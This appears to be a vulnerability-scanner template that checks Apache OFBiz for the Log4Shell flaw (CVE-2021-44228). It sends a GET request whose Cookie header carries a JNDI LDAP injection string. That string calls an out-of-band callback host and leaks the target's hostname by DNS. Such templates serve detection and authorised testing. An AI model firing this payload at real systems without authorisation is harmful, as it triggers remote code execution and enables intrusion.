id: apache-ofbiz-log4j-rce
brief:
    title: Apache OFBiz - JNDI Remote Code Execution (Apache Log4j)
    by: pdteam
    level: critical
    about: Apache OFBiz is affected by a remote code execution vulnerability in the bundled Apache Log4j logging library. Apache Log4j is vulnerable due to insufficient protections on message lookup substitut...
    label:
        - cve
        - cve2021
        - ofbiz
        - oast
        - log4j
        - rce
        - apache
        - jndi
        - kev
        - vuln
    score: CVE-2021-44228 CVSS:10.0
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/webtools/control/main'
      head:
        Cookie: OFBiz.Visitor=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.cookie.{{interactsh-url}}}
      signs:
        - "on": word
          has:
            - dns
          in: interactsh_protocol
          need: all
